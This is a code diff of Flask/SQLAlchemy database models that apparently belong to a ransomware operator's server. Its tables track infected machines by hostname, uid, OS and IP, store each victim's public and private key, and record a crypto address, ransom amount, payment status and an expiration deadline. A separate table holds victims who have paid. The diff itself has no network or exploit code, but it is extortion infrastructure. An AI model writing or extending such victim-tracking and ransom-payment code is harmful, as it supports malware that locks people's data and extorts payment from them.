@@ -6,70 +6,43 @@ from flask_login import UserMixin
 
 class Users(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(80))
+    username = db.Column(db.String(120))
+    password = db.Column(db.String(120))
     hostname = db.Column(db.String(120))
     uid = db.Column(db.String(120), unique=True)
-    os_name = db.Column(db.String(120))
-    os_version = db.Column(db.String(120))
-    os_architecture = db.Column(db.String(120))
     email = db.Column(db.String(120))
-    ip_address = db.Column(db.String(80))
+    ip_address = db.Column(db.String(120))
     # keys
     public_key = db.Column(db.String(4000))
     private_key = db.Column(db.String(10000))
     # payment details
-    crypto_address = db.Column(db.String(120), unique=True, nullable=False)
+    crypto_address = db.Column(db.String(120), unique=True)
     total_payment = db.Column(db.Float, nullable=False, default=0.0)
-    status = db.Column(db.Boolean, default=False, nullable=False)
-    amount_paid = db.Column(db.Float, default=0.0, nullable=False)
+    status = db.Column(db.Boolean, default=False)
+    amount_paid = db.Column(db.Float, default=0.0)
     address_index = db.Column(db.Integer, unique=True)
     # creation date
-    creation_date = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
-    expiration = db.Column(db.DateTime, nullable=False)
-
-    def __init__(self, username, hostname, uid, os_name, os_version, os_architecture, email, ip_address, public_key, private_key,
-                 crypto_address, total_payment, status, amount_paid, address_index, creation_date, expiration):
-        self.username = username
-        self.hostname = hostname
-        self.uid = uid
-        self.os_name = os_name
-        self.os_version = os_version
-        self.os_architecture = os_architecture
-        self.email = email
-        self.ip_address = ip_address
-        self.public_key = public_key
-        self.private_key = private_key
-        self.crypto_address = crypto_address
-        self.total_payment = total_payment
-        self.status = status
-        self.amount_paid = amount_paid
-        self.address_index = address_index
-        self.creation_date = creation_date
-        self.expiration = expiration
-
-    def __repr__(self):
-        return f'<UID {self.uid}>'
+    creation_date = db.Column(db.DateTime, default=datetime.utcnow)
+    expiration = db.Column(db.DateTime)
 
 
 class UsersPaid(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(80))
+    username = db.Column(db.String(120))
+    password = db.Column(db.String(120))
     hostname = db.Column(db.String(120))
     uid = db.Column(db.String(120), unique=True)
-    os_name = db.Column(db.String(120))
-    os_version = db.Column(db.String(120))
-    os_architecture = db.Column(db.String(120))
     email = db.Column(db.String(120))
-    ip_address = db.Column(db.String(80))
+    ip_address = db.Column(db.String(120))
     public_key = db.Column(db.String(4000))
     private_key = db.Column(db.String(10000))
-    crypto_address = db.Column(db.String(120), unique=True, nullable=False)
+    crypto_address = db.Column(db.String(120), unique=True)
     total_payment = db.Column(db.Float, nullable=False, default=0.0)
-    status = db.Column(db.Boolean, default=False, nullable=False)
-    amount_paid = db.Column(db.Float, default=0.0, nullable=False)
+    status = db.Column(db.Boolean, default=False)
+    amount_paid = db.Column(db.Float, default=0.0)
     address_index = db.Column(db.Integer, unique=True)
-    creation_date = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
-    payment_date = db.Column(db.DateTime, nullable=False)
+    creation_date = db.Column(db.DateTime, default=datetime.utcnow)
+    payment_date = db.Column(db.DateTime)
 
 
 class UsersData(db.Model):
